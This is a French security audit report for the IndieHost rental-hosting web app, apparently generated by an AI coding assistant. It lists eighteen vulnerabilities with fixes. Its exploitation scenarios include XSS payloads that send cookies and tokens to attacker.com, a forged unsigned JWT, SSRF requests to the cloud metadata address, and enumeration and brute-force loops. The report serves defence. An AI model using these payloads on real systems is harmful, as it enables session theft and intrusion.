# Rapport d'Audit de Sécurité — IndieHost

**Date :** 24 juin 2026  
**Auditeur :** Claude Code (analyse statique automatisée)  
**Version du projet :** branche `develop`  
**Périmètre :** Frontend Vue 3 + Backend Fastify + Microservice Python + Configuration infrastructure

---

## 1. Résumé Exécutif

L'audit de sécurité du projet IndieHost a identifié **18 vulnérabilités** réparties sur l'ensemble de la stack (frontend, backend API, configuration). Plusieurs problèmes critiques doivent être corrigés **avant toute mise en production**.

### Synthèse des risques

| Criticité | Nombre |
|-----------|--------|
| Critique | 0 |
| Haute | 6 |
| Moyenne | 5 |
| Faible | 2 |
| Informationnelle | 5 |

### Points positifs identifiés

- Utilisation de Prisma ORM (protection native contre les injections SQL)
- Validation des entrées avec Zod (bien que partielle)
- JWT pour l'authentification (Clerk)
- Gestion des secrets via fichiers Docker en production
- HTTPS configuré via Certbot/Let's Encrypt
- Transactions Prisma pour les opérations complexes
- Architecture modulaire avec middlewares d'auth

### Actions immédiates requises (avant production)

1. **Rotater immédiatement** les clés Clerk et Stripe si le `.env` a été committé
2. **Sanitizer tout le HTML** affiché via `v-html` (DOMPurify)
3. **Vérifier et compléter** les contrôles d'accès côté backend
4. **Supprimer le fallback d'authentification** de développement
5. **Ajouter une whitelist** sur l'import d'images distantes (anti-SSRF)

---

## 2. Périmètre et Méthodologie

### Périmètre analysé

| Composant | Chemin | Technologies |
|-----------|--------|--------------|
| Frontend | `frontend/src/` | Vue 3, TypeScript, Vite, Pinia |
| Backend API | `backend/api/src/` | Fastify 5, Prisma, Zod, Clerk JWT |
| Microservice scraping | `backend/microservices/microservice-scraping-py/` | FastAPI, Python |
| Configuration | `/`, `nginx/`, `docker-compose*.yml` | Docker, Nginx |

### Méthode appliquée

- **Analyse statique** : lecture exhaustive des fichiers source, configuration, schémas
- **Recherche de patterns** : secrets hardcodés, `v-html`, `eval()`, `exec()`, raw queries
- **Revue des flux** : auth → autorisation → validation → persistance → réponse
- **Simulation d'attaques** : OWASP Top 10, CWE Top 25
- **Revue des dépendances** : `package.json` backend et frontend

---

## 3. Tableau Récapitulatif des Vulnérabilités

| ID | Criticité | Titre | Fichier principal | CWE |
|----|-----------|-------|-------------------|-----|
| [SEC-001](#sec-001) | **Haute** | XSS via `v-html` sans sanitization | `Description.vue`, 60+ composants | CWE-79 |
| [SEC-002](#sec-002) | **Haute** | Secrets potentiellement exposés dans `.env` versionné | `.env` | CWE-798 |
| [SEC-003](#sec-003) | **Haute** | Fallback JWT sans vérification cryptographique | `auth.ts` | CWE-347 |
| [SEC-004](#sec-004) | **Haute** | SSRF via import d'images depuis URLs arbitraires | `medias.plugin.ts` | CWE-918 |
| [SEC-005](#sec-005) | **Haute** | Broken Access Control sur les listings | `listings.service.ts` | CWE-639 |
| [SEC-006](#sec-006) | **Haute** | Secret HMAC guides de réservation par défaut faible | `env.ts` | CWE-326 |
| [SEC-007](#sec-007) | Moyenne | Absence de rate limiting sur endpoints sensibles | `bookings.plugin.ts` | CWE-770 |
| [SEC-008](#sec-008) | Moyenne | Headers de sécurité HTTP manquants | `app.ts` | CWE-693 |
| [SEC-009](#sec-009) | Moyenne | Validation JSON laxe (`z.any()`) | `listings.schemas.ts` | CWE-20 |
| [SEC-010](#sec-010) | Moyenne | Import d'images sans authentification obligatoire | `medias.plugin.ts` | CWE-288 |
| [SEC-011](#sec-011) | Moyenne | Race condition possible sur réservations concurrentes | `bookings.service.ts` | CWE-362 |
| [SEC-012](#sec-012) | Faible | Vérification d'accès admin côté client contournable | `useAdminAccess.ts` | CWE-347 |
| [SEC-013](#sec-013) | Faible | Code de développement (auth fallback) en codebase prod | `auth.ts` | CWE-489 |
| [SEC-014](#sec-014) | Informationnelle | Informations sensibles dans messages d'erreur | `app.ts` | CWE-532 |
| [SEC-015](#sec-015) | Informationnelle | CORS avec wildcard en développement | `app.ts` | CWE-346 |
| [SEC-016](#sec-016) | Informationnelle | Absence de logging d'audit | `listings.service.ts` | CWE-778 |
| [SEC-017](#sec-017) | Informationnelle | Validation email insuffisante | `users.schemas.ts` | CWE-20 |
| [SEC-018](#sec-018) | Informationnelle | Noms d'hôte par défaut non rejetés | `users.repository.ts` | CWE-325 |

---

## 4. Détail des Vulnérabilités

---

### SEC-001

**Criticité : Haute**  
**Titre : XSS via `v-html` avec contenu utilisateur non échappé**  
**CWE : CWE-79 — Improper Neutralization of Input During Web Page Generation**

#### Description

Le composant `Description.vue` et plus de 60 autres composants Vue utilisent la directive `v-html` pour afficher du contenu provenant de la base de données (descriptions, notes, guides d'arrivée). L'éditeur Quill dans `DescriptionPanel.vue` récupère l'`innerHTML` brut et le stocke sans aucune sanitization. Ce HTML est ensuite affiché tel quel côté client.

**Fichiers concernés :**
- `frontend/src/views/ListingView/components/Core/components/Description/Description.vue` (lignes 46, 84–95)
- `frontend/src/views/Editor/components/EditorSidebar/panels/DescriptionPanel.vue`
- Nombreux composants affichant des données listing

#### Scénario d'exploitation

Un hôte malveillant crée une annonce avec la description suivante :

```html
<script>
  fetch('https://attacker.com/steal?token=' + document.cookie);
</script>
```

Ou plus discrètement via un attribut `onload` :

```html
<img src=x onerror="fetch('https://attacker.com/c?'+localStorage.getItem('clerk-token'))">
```

Tout visiteur de l'annonce exécute ce script. Le token Clerk stocké en `localStorage` est volé, permettant l'usurpation d'identité complète.

#### Correctif recommandé

```bash
npm install dompurify @types/dompurify --prefix frontend
```

```typescript
// frontend/src/utils/sanitize.ts
import DOMPurify from 'dompurify'

export function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h2', 'h3', 'a'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    FORCE_BODY: true
  })
}
```

```vue
<!-- Avant -->
<div v-html="listing.description" />

<!-- Après -->
<div v-html="sanitizeHtml(listing.description)" />
```

Remplacer **tous les usages** de `v-html` par cette version sanitizée.

---

### SEC-002

**Criticité : Haute**  
**Titre : Secrets potentiellement exposés dans `.env` versionné**  
**CWE : CWE-798 — Use of Hard-coded Credentials**

#### Description

Le fichier `.env` à la racine contient les clés secrètes Clerk (`CLERK_SECRET_KEY=sk_test_...`) et potentiellement d'autres credentials. Si ce fichier a été committé dans Git (même une seule fois dans l'historique), les secrets sont exposés de façon permanente.

**Fichier concerné :** `.env` (racine)

#### Scénario d'exploitation

```bash
# Un accès au dépôt Git (ou un ancien commit) expose les secrets
git log --all --full-history -- .env
git show <commit-hash>:.env

# Avec CLERK_SECRET_KEY, un attaquant peut :
# - Lister tous les utilisateurs de l'instance Clerk
# - Créer des sessions arbitraires
# - Supprimer des comptes

# Avec sk_test_ Stripe, un attaquant peut :
# - Lire toutes les transactions de test
# - Créer des remboursements frauduleux
```

#### Correctif recommandé

```bash
# Vérifier si .env est dans l'historique Git
git log --all --oneline -- .env

# Si oui, nettoyer l'historique (ATTENTION : réécrit l'historique)
# Utiliser git-filter-repo (plus sûr que filter-branch)
pip install git-filter-repo
git filter-repo --path .env --invert-paths

# Immédiatement après : rotater TOUTES les clés exposées
# Clerk : Dashboard → API Keys → Revoke
# Stripe : Dashboard → Developers → API keys → Roll
```

```bash
# .gitignore — s'assurer que ces lignes existent
.env
.env.local
.env.*.local
secrets/
```

```bash
# .env.example — version sans secrets à committer
CLERK_SECRET_KEY=<REPLACE_WITH_CLERK_SECRET_KEY>
VITE_CLERK_PUBLISHABLE_KEY=<REPLACE_WITH_CLERK_PUBLISHABLE_KEY>
VITE_STRIPE_PUBLISHABLE_KEY=<REPLACE_WITH_STRIPE_PUBLISHABLE_KEY>
```

---

### SEC-003

**Criticité : Haute**  
**Titre : Fallback JWT sans vérification cryptographique**  
**CWE : CWE-347 — Improper Verification of Cryptographic Signature**

#### Description

Dans `backend/api/src/plugins/auth.ts`, si `CLERK_JWKS_URL` ou `CLERK_ISSUER` ne sont pas configurés, le code décode le JWT en base64 sans vérification de signature (lignes 122–126). En mode `NODE_ENV=development`, même une vérification JWKS échouée utilise ce fallback (lignes 166–171). Cela signifie que n'importe quel JWT forgé est accepté comme valide.

**Fichier concerné :** `backend/api/src/plugins/auth.ts` (lignes 122–176)

#### Scénario d'exploitation

```javascript
// Un attaquant forge un JWT avec n'importe quel userId
const header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }))
const payload = btoa(JSON.stringify({
  sub: 'user_admin_id_here',
  azp: 'http://localhost',
  iss: 'https://possible-hagfish-82.clerk.accounts.dev'
}))
const fakeJWT = `${header}.${payload}.`

// En développement (ou si JWKS mal configuré), ce token est accepté
fetch('http://localhost/api/v1/listings', {
  headers: { Authorization: `Bearer ${fakeJWT}` }
})
// → Accès complet aux ressources de n'importe quel utilisateur
```

#### Correctif recommandé

```typescript
// backend/api/src/plugins/auth.ts
// Supprimer ENTIÈREMENT le bloc readDevAuthFallback
// La vérification JWKS doit TOUJOURS être requise

async function verifyJWT(token: string, config: AuthConfig): Promise<JWTPayload> {
  if (!config.jwksUrl || !config.issuer) {
    throw new Error('CLERK_JWKS_URL and CLERK_ISSUER must be configured')
  }
  
  const JWKS = createRemoteJWKSet(new URL(config.jwksUrl))
  const { payload } = await jwtVerify(token, JWKS, {
    issuer: config.issuer,
    // Ne PAS avoir de fallback en cas d'erreur
  })
  return payload
}
```

```typescript
// backend/api/src/config/env.ts — valider au démarrage
if (!process.env.CLERK_JWKS_URL || !process.env.CLERK_ISSUER) {
  throw new Error('Fatal: CLERK_JWKS_URL and CLERK_ISSUER are required')
}
```

---

### SEC-004

**Criticité : Haute**  
**Titre : SSRF via import d'images depuis URLs arbitraires**  
**CWE : CWE-918 — Server-Side Request Forgery**

#### Description

La route `POST /api/v1/medias/imagekit/import` accepte un tableau d'URLs fournies par l'utilisateur et télécharge les images depuis ces URLs via `imageKit.uploadRemoteImage()`. Il n'existe aucune validation du domaine ou de l'IP cible. Un attaquant peut faire effectuer des requêtes HTTP par le serveur vers n'importe quelle destination.

**Fichier concerné :** `backend/api/src/domains/medias/medias.plugin.ts` (lignes 80–156)

#### Scénario d'exploitation

```bash
# Accès aux métadonnées du serveur cloud (AWS, GCP, Azure)
POST /api/v1/medias/imagekit/import
{
  "images": [
    { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "alt": "x" }
  ]
}
# → Le serveur récupère et potentiellement enregistre les credentials IAM

# Scan du réseau interne Docker
{ "url": "http://postgres:5432/" }
{ "url": "http://api:4000/internal/admin" }

# Forcer des requêtes vers des services tiers (abuse)
{ "url": "http://victim-site.com/delete-account" }
```

#### Correctif recommandé

```typescript
// backend/api/src/domains/medias/medias.service.ts
import { URL } from 'url'

const ALLOWED_DOMAINS = [
  'images.airbnb.com',
  'a0.muscache.com',
  'cf.bstatic.com', // Booking.com
  'imagekit.io',
]

const PRIVATE_IP_PATTERNS = [
  /^127\./,
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
  /^192\.168\./,
  /^169\.254\./, // Link-local (metadata AWS/GCP)
  /^::1$/,
  /^fc00:/,
]

function validateImageUrl(rawUrl: string): void {
  let url: URL
  try {
    url = new URL(rawUrl)
  } catch {
    throw new Error('URL invalide')
  }

  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Protocole non autorisé')
  }

  // Bloquer les IPs privées
  if (PRIVATE_IP_PATTERNS.some(p => p.test(url.hostname))) {
    throw new Error('Destination non autorisée')
  }

  // Whitelist de domaines
  const isAllowed = ALLOWED_DOMAINS.some(d => 
    url.hostname === d || url.hostname.endsWith('.' + d)
  )
  if (!isAllowed) {
    throw new Error(`Domaine non autorisé: ${url.hostname}`)
  }
}
```

---

### SEC-005

**Criticité : Haute**  
**Titre : Broken Access Control — listings accessibles sans vérifier la propriété**  
**CWE : CWE-639 — Authorization Bypass Through User-Controlled Key**

#### Description

Les méthodes `getListingResource` et `getListingBundle` dans `listings.service.ts` (lignes 846–911) ne vérifient pas que l'utilisateur authentifié est bien le propriétaire du listing demandé. N'importe quel utilisateur authentifié peut accéder aux données complètes (y compris les brouillons, adresses précises, calendriers) de n'importe quel listing.

**Fichier concerné :** `backend/api/src/domains/listings/listings.service.ts` (lignes 846–911)

#### Scénario d'exploitation

```bash
# Étape 1 : Créer un compte sur IndieHost
# Étape 2 : Obtenir un JWT valide
# Étape 3 : Accéder aux listings d'autres utilisateurs

# Enumérer les IDs de listing (séquentiels ou UUIDs prévisibles)
for id in $(seq 1 1000); do
  curl -H "Authorization: Bearer $MY_JWT" \
    "https://indiehost.fr/api/v1/listings/$id/bundle"
done

# Résultat : toutes les annonces (brouillons, adresses, calendriers, revenus)
```

#### Correctif recommandé

```typescript
// backend/api/src/domains/listings/listings.service.ts
async getListingBundle(listingId: string, requestingUserId?: string): Promise<ListingBundle> {
  const listing = await this.repository.findById(listingId)
  if (!listing) throw new NotFoundError()

  // Pour les annonces publiées : accès public autorisé
  if (listing.status === 'published') {
    return this.formatBundle(listing)
  }

  // Pour les brouillons/pauses : propriétaire uniquement
  if (!requestingUserId || listing.ownerId !== requestingUserId) {
    throw new ForbiddenError('Accès non autorisé à cette annonce')
  }

  return this.formatBundle(listing)
}
```

---

### SEC-006

**Criticité : Haute**  
**Titre : Secret HMAC pour guides de réservation — valeur par défaut faible**  
**CWE : CWE-326 — Inadequate Encryption Strength**

#### Description

La variable `BOOKING_GUIDE_ACCESS_SECRET` dans `backend/api/src/config/env.ts` (ligne 63) a une valeur par défaut en clair : `'indiehost_booking_guide_secret'`. Ce secret sert de clé HMAC pour protéger les liens d'accès aux guides de réservation des voyageurs. Si cette valeur n'est pas changée (ce qui est probable dans une installation rapide), l'HMAC est trivial à reproduire.

#### Scénario d'exploitation

```javascript
// Connaissant la clé par défaut, un attaquant génère un token valide
const crypto = require('crypto')
const secret = 'indiehost_booking_guide_secret' // valeur par défaut connue
const reservationId = 'res_12345' // ou bruteforce

const token = crypto
  .createHmac('sha256', secret)
  .update(reservationId)
  .digest('hex')

// Accès au guide de réservation d'un autre voyageur
fetch(`https://indiehost.fr/listing/guide/${reservationId}?token=${token}`)
// → Informations privées d'arrivée, codes d'accès, adresse exacte
```

#### Correctif recommandé

```typescript
// backend/api/src/config/env.ts
const bookingGuideSecret = process.env.BOOKING_GUIDE_ACCESS_SECRET

if (!bookingGuideSecret || bookingGuideSecret === 'indiehost_booking_guide_secret') {
  if (process.env.NODE_ENV === 'production') {
    throw new Error('Fatal: BOOKING_GUIDE_ACCESS_SECRET must be set to a secure random value in production')
  }
  console.warn('⚠️  BOOKING_GUIDE_ACCESS_SECRET uses insecure default value')
}
```

```bash
# Générer une valeur sécurisée
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# → stocker dans .env ou secrets/booking_guide_secret.txt
```

---

### SEC-007

**Criticité : Moyenne**  
**Titre : Absence de rate limiting sur les endpoints sensibles**  
**CWE : CWE-770 — Allocation of Resources Without Limits or Throttling**

#### Description

Les endpoints `GET /bookings/:reservationId/confirmation` et `POST /bookings/:reservationId/cancel` acceptent un `token` (query param ou body) sans limitation du nombre de tentatives. Un attaquant peut bruteforcer les tokens de confirmation de réservation.

**Fichier concerné :** `backend/api/src/domains/bookings/bookings.plugin.ts` (lignes 119–181)

#### Scénario d'exploitation

```bash
# Bruteforce du token de confirmation (si token court ou prévisible)
for token in $(openssl rand -hex 16 | head -c 1000000 | fold -w 32); do
  curl -s "https://indiehost.fr/api/v1/bookings/res_12345/confirmation?token=$token"
done
```

#### Correctif recommandé

```bash
npm install @fastify/rate-limit --prefix backend/api
```

```typescript
// backend/api/src/app.ts
import rateLimit from '@fastify/rate-limit'

await fastify.register(rateLimit, {
  global: false, // appliquer sélectivement
})

// backend/api/src/domains/bookings/bookings.plugin.ts
fastify.get('/bookings/:reservationId/confirmation', {
  config: {
    rateLimit: {
      max: 5,
      timeWindow: '15 minutes',
      keyGenerator: (req) => req.ip,
      errorResponseBuilder: () => ({
        statusCode: 429,
        error: 'Too Many Requests',
        message: 'Trop de tentatives. Réessayez dans 15 minutes.'
      })
    }
  }
}, handler)
```

---

### SEC-008

**Criticité : Moyenne**  
**Titre : Headers de sécurité HTTP manquants**  
**CWE : CWE-693 — Protection Mechanism Failure**

#### Description

L'application Fastify ne configure aucun header de sécurité. Les navigateurs ne bénéficient d'aucune protection contre le clickjacking, le MIME sniffing, ou les injections XSS au niveau transport.

**Headers manquants :**
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Strict-Transport-Security`
- `Content-Security-Policy`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy`

#### Correctif recommandé

```bash
npm install @fastify/helmet --prefix backend/api
```

```typescript
// backend/api/src/app.ts
import helmet from '@fastify/helmet'

await fastify.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", 'https://js.stripe.com', 'https://accounts.clerk.dev'],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https://ik.imagekit.io', 'blob:'],
      connectSrc: ["'self'", 'https://api.stripe.com', 'https://clerk.accounts.dev'],
      frameSrc: ["'none'"],
      objectSrc: ["'none'"],
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
})
```

---

### SEC-009

**Criticité : Moyenne**  
**Titre : Validation JSON laxe avec `z.record(z.any())`**  
**CWE : CWE-20 — Improper Input Validation**

#### Description

Les schémas Zod dans `listings.schemas.ts` (ligne 54) utilisent `z.record(z.any())` pour le patch des ressources listing. Cela accepte n'importe quelle structure JSON, permettant l'injection de champs arbitraires (prototypes pollution, champs non prévus, données malformées).

**Fichier concerné :** `backend/api/src/domains/listings/listings.schemas.ts`

#### Correctif recommandé

```typescript
// Remplacer z.record(z.any()) par des schémas explicites
const patchListingCoreSchema = z.object({
  title: z.string().max(200).optional(),
  description: z.string().max(10000).optional(),
  type: z.enum(['apartment', 'house', 'gite', 'villa']).optional(),
  city: z.string().max(100).optional(),
  guest_capacity: z.number().int().min(1).max(50).optional(),
  // ... énumérer tous les champs acceptés
}).strict() // .strict() rejette les champs inconnus
```

---

### SEC-010

**Criticité : Moyenne**  
**Titre : Import d'images sans authentification obligatoire**  
**CWE : CWE-288 — Authentication Bypass Using an Alternate Path**

#### Description

La route `POST /medias/imagekit/import` utilise `authenticateOptional` au lieu de `authenticate`. Un utilisateur non authentifié peut déclencher des imports d'images, consommant les ressources du serveur et les quotas ImageKit.

**Fichier concerné :** `backend/api/src/domains/medias/medias.plugin.ts` (ligne 70)

#### Correctif recommandé

```typescript
// Avant
fastify.post('/import', { preHandler: [fastify.authenticateOptional] }, handler)

// Après
fastify.post('/import', { preHandler: [fastify.authenticate] }, handler)
```

---

### SEC-011

**Criticité : Moyenne**  
**Titre : Race condition possible sur les réservations concurrentes**  
**CWE : CWE-362 — Concurrent Execution using Shared Resource with Improper Synchronization**

#### Description

Lors de la création d'une réservation, la disponibilité des dates est vérifiée puis la réservation est créée en deux opérations distinctes. Si deux utilisateurs soumettent simultanément une réservation pour les mêmes dates, les deux pourraient passer la vérification avant que l'une soit enregistrée.

**Fichier concerné :** `backend/api/src/domains/bookings/bookings.service.ts`

#### Correctif recommandé

```typescript
// Utiliser une transaction Prisma avec sélection FOR UPDATE
const reservation = await prisma.$transaction(async (tx) => {
  // Verrouiller le listing pendant la vérification
  const listing = await tx.$queryRaw`
    SELECT id FROM "Listing" WHERE id = ${listingId} FOR UPDATE
  `
  
  // Vérifier disponibilité dans la transaction
  const conflicts = await tx.calendarEvent.findFirst({
    where: {
      listingId,
      OR: [
        { startDate: { lte: endDate }, endDate: { gte: startDate } }
      ]
    }
  })
  
  if (conflicts) throw new ConflictError('Dates non disponibles')
  
  // Créer la réservation dans la même transaction
  return tx.reservation.create({ data: { ... } })
})
```

---

### SEC-012

**Criticité : Faible**  
**Titre : Vérification d'accès admin côté client contournable**  
**CWE : CWE-347 — Improper Verification of Cryptographic Signature**

#### Description

Le composable `useAdminAccess.ts` vérifie l'accès admin en combinant un flag Clerk (`hasClerkAdminRole`) et un appel API. Les vérifications côté client sont toujours contournables via les DevTools.

**Fichier concerné :** `frontend/src/composables/useAdminAccess.ts`

#### Correctif recommandé

S'assurer que **chaque endpoint admin** côté backend vérifie indépendamment le rôle admin depuis le JWT Clerk, sans dépendre des vérifications frontend.

---

### SEC-013

**Criticité : Faible**  
**Titre : Code de développement (auth fallback) présent en codebase production**  
**CWE : CWE-489 — Active Debug Code**

#### Description

Le fallback d'authentification de développement est dans le même fichier que le code de production. Si `NODE_ENV` est mal configuré en production, ce code dangeureux s'active silencieusement.

**Fichier concerné :** `backend/api/src/plugins/auth.ts`

#### Correctif recommandé

Supprimer entièrement le bloc `readDevAuthFallback`. En développement, utiliser de vraies clés Clerk de test.

---

### SEC-014

**Criticité : Informationnelle**  
**Titre : Messages d'erreur internes exposés aux clients**  
**CWE : CWE-532 — Insertion of Sensitive Information into Log File**

#### Description

L'error handler de `app.ts` (lignes 104–132) transmet les messages d'erreur Prisma ou Stripe directement dans la réponse HTTP. Ces messages peuvent révéler la structure de la base de données, des noms de tables, ou des détails d'implémentation.

#### Correctif recommandé

```typescript
fastify.setErrorHandler((error, request, reply) => {
  fastify.log.error({ err: error, url: request.url }, 'Request error')

  // Ne jamais exposer les détails internes
  const isOperationalError = error instanceof AppError
  reply.status(isOperationalError ? error.statusCode : 500).send({
    error: isOperationalError ? error.message : 'Une erreur interne est survenue',
    code: isOperationalError ? error.code : 'INTERNAL_ERROR'
  })
})
```

---

### SEC-015

**Criticité : Informationnelle**  
**Titre : CORS avec wildcard de sous-domaine en développement**  
**CWE : CWE-346 — Origin Validation Error**

#### Description

La configuration CORS dans `app.ts` accepte `http://*.localhost:5179` via une fonction de validation dynamique. Si cette configuration migre en production avec des wildcards insuffisamment restreints, n'importe quel sous-domaine contrôlé par un attaquant pourrait effectuer des requêtes cross-origin.

#### Correctif recommandé

En production, énumérer explicitement les origins autorisés dans `CORS_ORIGINS` sans wildcards.

---

### SEC-016

**Criticité : Informationnelle**  
**Titre : Absence de logging d'audit pour les actions critiques**  
**CWE : CWE-778 — Insufficient Logging**

#### Description

Des opérations critiques comme `transferListingOwnership`, la publication d'annonces, ou les annulations de réservation ne sont pas journalisées avec le contexte utilisateur (qui a fait quoi, quand, depuis quelle IP).

#### Correctif recommandé

Implémenter une table `AuditLog` Prisma :

```prisma
model AuditLog {
  id        String   @id @default(cuid())
  userId    String
  action    String
  resource  String
  resourceId String
  metadata  Json?
  ip        String?
  createdAt DateTime @default(now())
}
```

---

### SEC-017

**Criticité : Informationnelle**  
**Titre : Validation email insuffisante — pas de vérification d'unicité**  
**CWE : CWE-20 — Improper Input Validation**

#### Description

Le schéma `updateMeSchema` dans `users.schemas.ts` valide uniquement le format de l'email via `z.string().email()`. Il n'y a pas de vérification que l'email n'est pas déjà utilisé par un autre compte, ni de confirmation par email.

#### Correctif recommandé

Ajouter une vérification d'unicité en base de données avant la mise à jour, et implémenter un flux de vérification par email.

---

### SEC-018

**Criticité : Informationnelle**  
**Titre : Noms d'hôte par défaut non rejetés**  
**CWE : CWE-325 — Missing Cryptographic Step**

#### Description

`users.repository.ts` (lignes 37–43) détecte les profils avec les noms par défaut `'host'` ou `'hote'` comme dépréciés mais les accepte quand même en fallback.

#### Correctif recommandé

Forcer la personnalisation du profil lors du premier accès au dashboard, et rejeter explicitement les noms par défaut.

---

## 5. Recommandations Générales

### Priorité immédiate

1. **Rotater les secrets** : Clerk, Stripe, et BOOKING_GUIDE_ACCESS_SECRET si compromis
2. **Installer DOMPurify** et sanitizer tous les `v-html`
3. **Ajouter `@fastify/helmet`** pour les headers HTTP de sécurité
4. **Implémenter le rate limiting** sur tous les endpoints avec tokens/passwords

### Court terme (< 1 mois)

5. **Remplacer `z.any()`** par des schémas Zod explicites et stricts
6. **Ajouter la whitelist SSRF** sur l'import d'images
7. **Supprimer le fallback JWT** de développement du codebase
8. **Compléter les vérifications d'ownership** dans tous les services backend
9. **Ajouter des transactions atomiques** sur les réservations

### Moyen terme (1–3 mois)

10. **Audit de dépendances automatisé** : Intégrer `npm audit` + Dependabot/Snyk dans la CI/CD
11. **Logging d'audit** : Table dédiée pour les actions critiques
12. **Tests de sécurité** : Ajouter des tests automatisés avec OWASP ZAP
13. **CSP stricte** : Content-Security-Policy configurée côté nginx et Fastify
14. **2FA admin** : Activer MFA obligatoire pour les comptes admin via Clerk

### CI/CD et processus

```yaml
# Exemple : ajouter à la pipeline GitHub Actions
security-audit:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - name: NPM Audit Backend
      run: cd backend/api && npm audit --audit-level=high
    - name: NPM Audit Frontend
      run: cd frontend && npm audit --audit-level=high
    - name: Check for secrets
      uses: trufflesecurity/trufflehog@main
      with:
        path: ./
        base: ${{ github.event.repository.default_branch }}
```

---

## 6. Annexes

### A. Références

| Référence | Lien |
|-----------|------|
| OWASP Top 10 2021 | https://owasp.org/Top10/ |
| CWE Top 25 | https://cwe.mitre.org/top25/ |
| Fastify Security | https://fastify.dev/docs/latest/Reference/Security/ |
| Clerk Security Best Practices | https://clerk.com/docs/security/overview |
| DOMPurify | https://github.com/cure53/DOMPurify |

### B. Environnement de test

- Analyse effectuée sur la branche `develop`
- Commit de référence : `0e08b87`
- Date d'analyse : 24 juin 2026

### C. Scope exclu

- Tests de pénétration dynamiques (non effectués dans cet audit statique)
- Analyse des dépendances tierces profondes (sous-dépendances)
- Tests d'infrastructure (serveurs de production non accessibles)

---

*Rapport généré automatiquement par analyse statique. Un audit de pénétration dynamique est recommandé avant la mise en production.*
